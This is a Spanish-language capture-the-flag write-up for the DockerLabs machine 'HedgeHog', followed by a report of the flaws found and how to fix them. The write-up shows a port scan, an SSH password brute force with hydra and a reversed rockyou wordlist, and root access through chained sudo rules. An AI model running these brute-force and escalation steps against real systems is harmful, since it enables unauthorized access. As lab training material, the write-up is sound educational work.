# HedgeHog

> Usuario filtrado en la web, fuerza bruta SSH con un rockyou invertido y escalada encadenada tails → sonic → root vía sudo.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Muy fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 22/tcp (SSH), 80/tcp (HTTP) |
| **Saltos de usuario** | 3 |

**Tags:** `Gobuster` · `Diccionario invertido` · `Hydra` · `sudo -u` · `Escalada encadenada`

---

## Reconocimiento

```bash
$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oN allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Al abrir el puerto 80, la web solo muestra la palabra 'tails': pinta de nombre de usuario. Gobuster no encuentra más directorios, así que la pista sigue siendo el usuario **tails**.

## Explotación · rockyou invertido

La fuerza bruta normal no da resultado. Como truco, invierto el orden del rockyou.txt y elimino los espacios.

```bash
$ cp /usr/share/wordlists/rockyou.txt .
$ tac rockyou.txt >> invertido.txt
$ sed -i 's/ //g' invertido.txt
$ hydra -l tails -P invertido.txt ssh://172.17.0.2
[22][ssh] host: 172.17.0.2   login: tails   password: 3117548331
```

Con **tails : 3117548331** entro por SSH.

```bash
$ ssh tails@172.17.0.2
tails@hedgehog:~$
```

## Escalada encadenada · tails → sonic → root

```bash
$ sudo -l
User tails may run the following commands:
    (sonic) NOPASSWD: ALL
$ sudo -u sonic /bin/bash
sonic@hedgehog:~$ whoami
sonic
```

sonic, a su vez, puede ejecutar cualquier comando como cualquier usuario, incluido root.

```bash
$ sudo -u root /bin/bash
# whoami
root
```

Máquina HedgeHog completada: cadena tails → sonic → root.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Escalada a root por sudo encadenado mal configurado

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** Permisos sudo excesivos permiten saltar de tails a sonic y de sonic a root (sonic puede ejecutar cualquier comando como cualquier usuario).

**Mitigación.** Revisar sudoers con mínimo privilegio; evitar comodines y permisos que permitan ejecutar como cualquier usuario.

### 🟠 ALTA — Contraseña débil susceptible a fuerza bruta

`CWE-521` · A07:2021 – Identification and Authentication Failures

**Impacto.** La contraseña está en variantes de rockyou, accesible por SSH mediante fuerza bruta.

**Mitigación.** Contraseñas robustas, bloqueo de intentos (fail2ban) y autenticación por clave.

### ⚪ BAJA — Divulgación de un usuario válido en la web

`CWE-200` · A07:2021 – Identification and Authentication Failures

**Impacto.** La web muestra el nombre de usuario 'tails', dando un objetivo directo para la fuerza bruta.

**Mitigación.** No exponer nombres de usuario ni pistas sobre cuentas en contenido público.

---

_Writeup de **HedgeHog** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
